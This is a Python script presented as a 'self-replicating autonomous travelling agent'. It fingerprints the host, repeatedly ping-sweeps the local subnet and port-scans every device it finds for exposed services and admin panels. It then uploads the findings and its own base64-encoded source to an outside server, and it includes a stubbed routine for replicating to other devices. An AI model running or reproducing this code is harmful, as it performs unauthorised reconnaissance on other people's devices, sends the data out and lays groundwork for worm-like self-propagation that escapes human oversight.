#!/usr/bin/env python3
"""
🌍 NUPI TRAVELLING AGENT - Self-Replicating Autonomous Agent
Travels across devices, cloud, and networks autonomously
Built for: Jedarius Maxwell
"""

import psutil
import platform
import socket
import time
import requests
import json
import subprocess
import os
import hashlib
import base64
from datetime import datetime
from threading import Thread
import sys
import tempfile
import shutil

class TravellingAgent:
    def __init__(self):
        self.agent_id = self.generate_agent_id()
        self.cloud_url = "https://nupidesktopai.com"
        self.running = True
        self.hostname = socket.gethostname()
        self.platform = platform.system()
        self.visited_devices = []
        self.current_location = self.get_device_fingerprint()
        
        print("🌍 NUPI TRAVELLING AGENT - INITIALIZING...")
        print(f"🆔 Agent ID: {self.agent_id}")
        print(f"📱 Current Device: {self.hostname}")
        print(f"💻 Platform: {self.platform}")
        print(f"📍 Location Hash: {self.current_location[:16]}...")
        print("━" * 70)
        
        # Register arrival on this device
        self.register_visit()
        
    def generate_agent_id(self):
        """Generate unique agent ID based on initial spawn location"""
        data = f"{socket.gethostname()}{datetime.now().isoformat()}{os.getpid()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
    
    def get_device_fingerprint(self):
        """Create unique fingerprint for current device"""
        try:
            fingerprint_data = {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'mac_address': self.get_mac_address(),
                'local_ip': socket.gethostbyname(socket.gethostname())
            }
            fingerprint_str = json.dumps(fingerprint_data, sort_keys=True)
            return hashlib.sha256(fingerprint_str.encode()).hexdigest()
        except:
            return hashlib.sha256(f"{socket.gethostname()}{time.time()}".encode()).hexdigest()
    
    def get_mac_address(self):
        """Get MAC address of primary network interface"""
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                           for ele in range(0,8*6,8)][::-1])
            return mac
        except:
            return "unknown"
    
    def register_visit(self):
        """Register this agent's visit to current device"""
        visit_data = {
            'agent_id': self.agent_id,
            'device_fingerprint': self.current_location,
            'hostname': self.hostname,
            'platform': self.platform,
            'timestamp': datetime.now().isoformat(),
            'visited_count': len(self.visited_devices)
        }
        
        self.visited_devices.append(visit_data)
        
        # Report to cloud
        try:
            requests.post(
                f"{self.cloud_url}/api/travelling-agent/visit",
                json=visit_data,
                timeout=5
            )
            print(f"✅ Registered visit on {self.hostname}")
        except Exception as e:
            print(f"⚠️  Could not register with cloud: {str(e)[:50]}")
    
    def get_agent_code(self):
        """Get this agent's source code for replication"""
        try:
            with open(__file__, 'r') as f:
                return f.read()
        except:
            return None
    
    def discover_nearby_devices(self):
        """Discover devices on local WiFi network"""
        print("🔍 SCANNING WIFI NETWORK FOR DEVICES...")
        devices = []
        
        try:
            # Get local network range
            local_ip = socket.gethostbyname(socket.gethostname())
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            
            print(f"📡 Local network: {network_prefix}.0/24")
            print(f"🖥️  Your IP: {local_ip}")
            
            # Scan entire subnet (254 IPs) for thorough discovery
            print(f"🔍 Scanning {network_prefix}.1-254 ...")
            
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                
                # Skip current device
                if ip == local_ip:
                    continue
                
                # Try to ping (quick check)
                try:
                    if self.platform == "Windows":
                        result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], 
                                              capture_output=True, timeout=0.3)
                    else:
                        result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                              capture_output=True, timeout=0.3)
                    
                    if result.returncode == 0:
                        # Try to get hostname
                        hostname = 'unknown'
                        try:
                            hostname = socket.gethostbyaddr(ip)[0]
                        except:
                            pass
                        
                        devices.append({
                            'ip': ip,
                            'hostname': hostname,
                            'reachable': True,
                            'network': network_prefix + '.0/24',
                            'scan_time': datetime.now().isoformat()
                        })
                        print(f"  ✅ Found: {ip} ({hostname})")
                except:
                    pass
            
        except Exception as e:
            print(f"⚠️  Network scan error: {e}")
        
        print(f"🔍 Discovered {len(devices)} devices on WiFi network")
        return devices
    
    def scan_exposed_data(self, device):
        """Scan device for exposed data/services and collect info"""
        ip = device['ip']
        hostname = device.get('hostname', 'unknown')
        
        exposed_data = {
            'ip': ip,
            'hostname': hostname,
            'open_ports': [],
            'services': [],
            'vulnerabilities': [],
            'exposed_endpoints': [],
            'device_info': {},
            'scan_timestamp': datetime.now().isoformat()
        }
        
        print(f"\n🔍 ═══ SCANNING DEVICE FOR EXPOSED DATA ═══")
        print(f"🎯 Target: {ip} ({hostname})")
        
        # Common ports to check for exposed services
        security_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            80: 'HTTP', 443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
        }
        
        # Scan for open ports
        for port, service in security_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    exposed_data['open_ports'].append(port)
                    exposed_data['services'].append({'port': port, 'service': service})
                    print(f"  🚨 EXPOSED: Port {port} ({service}) - OPEN")
                    
                    # Check for common vulnerabilities
                    if port in [21, 23]:  # FTP, Telnet
                        exposed_data['vulnerabilities'].append(f"Unencrypted {service} protocol exposed")
                    elif port == 3389:  # RDP
                        exposed_data['vulnerabilities'].append("Remote Desktop exposed to network")
                    elif port in [3306, 5432, 27017]:  # Databases
                        exposed_data['vulnerabilities'].append(f"Database port exposed ({service})")
            except:
                pass
        
        # Try to gather HTTP info from web servers
        for port in [80, 8080, 443, 8443]:
            if port in exposed_data['open_ports']:
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    response = requests.get(f"{protocol}://{ip}:{port}", timeout=2, verify=False)
                    
                    # Collect exposed endpoint info
                    endpoint_info = {
                        'port': port,
                        'status_code': response.status_code,
                        'server': response.headers.get('Server', 'Unknown'),
                        'content_length': len(response.content),
                        'has_admin_panel': '/admin' in response.text.lower() or '/login' in response.text.lower()
                    }
                    
                    exposed_data['exposed_endpoints'].append(endpoint_info)
                    print(f"  🌐 HTTP Service: {protocol}://{ip}:{port} - {response.status_code}")
                    
                    if endpoint_info['has_admin_panel']:
                        print(f"  ⚠️  Admin/Login panel detected!")
                        exposed_data['vulnerabilities'].append("Admin panel accessible without VPN")
                except:
                    pass
        
        # Collect device type info
        if 'roku' in hostname.lower():
            exposed_data['device_info']['type'] = 'Roku Smart TV'
        elif 'galaxy' in hostname.lower() or 'samsung' in hostname.lower():
            exposed_data['device_info']['type'] = 'Samsung Mobile Device'
        elif 'imac' in hostname.lower() or 'macbook' in hostname.lower():
            exposed_data['device_info']['type'] = 'Apple Computer'
        elif 'iphone' in hostname.lower() or 'ipad' in hostname.lower():
            exposed_data['device_info']['type'] = 'Apple Mobile Device'
        else:
            exposed_data['device_info']['type'] = 'Unknown Device'
        
        return exposed_data
    
    def network_hop_to_device(self, device):
        """Hop to a discovered device, scan for exposed data, and report to cloud"""
        ip = device['ip']
        hostname = device.get('hostname', 'unknown')
        
        print(f"\n🌐 ═══ NETWORK HOP INITIATED ═══")
        print(f"🎯 Target: {ip} ({hostname})")
        
        try:
            # Scan device for exposed data/vulnerabilities
            exposed_data = self.scan_exposed_data(device)
            
            # Report findings to cloud
            print(f"  📡 Sending exposure report to cloud...")
            
            hop_data = {
                'agent_id': self.agent_id,
                'source_device': self.hostname,
                'target_ip': ip,
                'target_hostname': hostname,
                'network': device.get('network', 'unknown'),
                'timestamp': datetime.now().isoformat(),
                'hop_method': 'security_scan',
                'exposed_data': exposed_data  # Include all findings
            }
            
            response = requests.post(
                f"{self.cloud_url}/api/travelling-agent/network-hop",
                json=hop_data,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"  ✅ Exposure report sent to cloud")
                print(f"  📊 Found: {len(exposed_data['open_ports'])} open ports, {len(exposed_data['vulnerabilities'])} vulnerabilities")
                return True
            
        except Exception as e:
            print(f"  ⚠️  Scan failed: {str(e)[:50]}")
        
        return False
    
    def replicate_to_device(self, device_ip):
        """Attempt to replicate agent to another device"""
        print(f"🚀 ATTEMPTING REPLICATION to {device_ip}...")
        
        try:
            # Get agent code
            agent_code = self.get_agent_code()
            if not agent_code:
                print("❌ Could not read agent code")
                return False
            
            # Try SSH (most common remote access)
            # Note: This requires SSH access and authentication
            # In real deployment, you'd use proper authentication
            
            print(f"  📡 Establishing connection to {device_ip}...")
            print(f"  ⚠️  Would need SSH credentials for actual deployment")
            print(f"  💡 Instead, reporting to cloud for coordinated deployment")
            
            # Report replication attempt to cloud
            replication_data = {
                'agent_id': self.agent_id,
                'source_device': self.current_location,
                'target_ip': device_ip,
                'status': 'pending',
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.cloud_url}/api/travelling-agent/replicate",
                json=replication_data,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"✅ Replication request sent to cloud")
                return True
            
        except Exception as e:
            print(f"❌ Replication failed: {str(e)[:50]}")
        
        return False
    
    def travel_to_cloud(self):
        """Upload agent to cloud for remote execution"""
        print("☁️  TRAVELLING TO CLOUD...")
        
        try:
            agent_code = self.get_agent_code()
            if not agent_code:
                print("❌ Could not read agent code")
                return False
            
            # Encode agent
            encoded_agent = base64.b64encode(agent_code.encode()).decode()
            
            travel_data = {
                'agent_id': self.agent_id,
                'source_device': self.current_location,
                'source_hostname': self.hostname,
                'agent_code': encoded_agent,
                'visited_devices': self.visited_devices,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.cloud_url}/api/travelling-agent/upload",
                json=travel_data,
                timeout=10
            )
            
            if response.status_code == 200:
                print("✅ Successfully travelled to cloud!")
                print("☁️  Agent now running in NUPI Cloud")
                return True
            else:
                print(f"⚠️  Cloud upload status: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Cloud travel failed: {str(e)[:50]}")
        
        return False
    
    def autonomous_travel_mode(self):
        """Autonomous mode - continuously travel and network hop"""
        print("🌍 AUTONOMOUS TRAVEL MODE ACTIVATED")
        print("🚀 Agent will network hop every 2 minutes")
        print("🌐 Scanning WiFi network for devices to visit")
        print("━" * 70)
        
        travel_count = 0
        hop_count = 0
        
        while self.running:
            try:
                # Wait 2 minutes between network scans (faster hopping)
                print(f"\n⏰ Next network scan in 2 minutes...")
                print(f"   Travels: {travel_count} | Network Hops: {hop_count}")
                time.sleep(120)  # 2 minutes
                
                # Discover nearby devices on WiFi
                devices = self.discover_nearby_devices()
                
                # Network hop to ALL discovered devices
                if devices:
                    print(f"\n🌐 ═══ INITIATING NETWORK HOPS ═══")
                    print(f"🎯 Attempting to hop to {len(devices)} devices...")
                    
                    for device in devices:
                        hop_success = self.network_hop_to_device(device)
                        if hop_success:
                            hop_count += 1
                        time.sleep(1)  # Brief pause between hops
                    
                    print(f"\n✅ Hopped to {hop_count} total devices")
                else:
                    print("⚠️  No devices found on network")
                
                # Travel to cloud every cycle
                print("\n☁️  ═══ INITIATING CLOUD TRAVEL ═══")
                cloud_success = self.travel_to_cloud()
                
                if cloud_success:
                    travel_count += 1
                
                # Report status
                self.report_status()
                
            except KeyboardInterrupt:
                print("\n🛑 Stopping travelling agent...")
                self.running = False
                break
            except Exception as e:
                print(f"❌ Error in travel loop: {e}")
                time.sleep(60)
    
    def report_status(self):
        """Report current status to cloud"""
        try:
            status_data = {
                'agent_id': self.agent_id,
                'current_location': self.current_location,
                'hostname': self.hostname,
                'platform': self.platform,
                'visited_count': len(self.visited_devices),
                'uptime_seconds': time.process_time(),
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.cloud_url}/api/travelling-agent/status",
                json=status_data,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"📊 Status reported: {len(self.visited_devices)} devices visited")
                
        except Exception as e:
            print(f"⚠️  Status report failed: {str(e)[:30]}")
    
    def run(self):
        """Start the travelling agent"""
        print("🔥 STARTING TRAVELLING AGENT...")
        print("━" * 70)
        print("🌍 This agent will:")
        print("  1. Monitor current device")
        print("  2. Discover nearby devices on network")
        print("  3. Travel to cloud every 5 minutes")
        print("  4. Attempt to replicate to other devices")
        print("  5. Report all travels to NUPI Cloud")
        print("━" * 70)
        
        # Start status reporter thread
        status_thread = Thread(target=self.periodic_status, daemon=True)
        status_thread.start()
        
        # Start autonomous travel
        print("🚀 LAUNCHING AUTONOMOUS TRAVEL MODE...")
        self.autonomous_travel_mode()
        
        print("✅ Travelling agent stopped")
    
    def periodic_status(self):
        """Send periodic status updates"""
        while self.running:
            try:
                time.sleep(60)  # Every minute
                self.report_status()
            except:
                pass

def main():
    print("━" * 70)
    print("🌍 NUPI TRAVELLING AGENT")
    print("━" * 70)
    print("This agent travels autonomously across:")
    print("  ✈️  Local network devices")
    print("  ☁️  Cloud infrastructure")
    print("  🌐 Internet-connected systems")
    print("━" * 70)
    
    agent = TravellingAgent()
    
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\n🛑 Agent stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
    finally:
        print("👋 Travelling agent shutdown complete")

if __name__ == "__main__":
    main()
